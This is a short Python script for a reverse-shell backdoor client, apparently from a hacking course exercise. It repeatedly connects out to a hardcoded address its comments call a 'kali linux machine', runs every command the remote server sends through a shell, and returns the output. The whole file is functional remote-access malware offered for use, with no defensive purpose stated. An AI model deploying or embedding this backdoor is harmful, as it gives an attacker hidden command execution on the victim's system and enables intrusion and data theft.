import socket
import time 
import json
import subprocess # execute every command that server sends


#takes data we are going to send
def reliable_send(data):
    jsondata=json.dumps(data) #store actual command
    s.send(jsondata.encode()) #send encoded data to target.
    pass


def reliable_recv():
    data= ''
    while True:
        try:
            #get 1024 bites from serrver
            print("data received")
            data = data + s.recv(1024).decode().rstrip() #decode data
            print("returning Data")
            return json.loads(data)
        except ValueError:
            continue 
pass


#try to connect to kali linux machine
def connection():
    while True: 
        time.sleep(5)
        try:
            s.connect(("192.168.0.208",5555))
            shell()
            s.close
            break
        except:
            connection()


#work on received commands from server
def shell():
    while True:
        command = reliable_recv()
        if command== 'quit':
            break
        else:
            execute= subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read() #gives output of cmd
            result= result.decode()
            print(result)
            reliable_send(result)

#first establish a connection between Payload and Server.
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()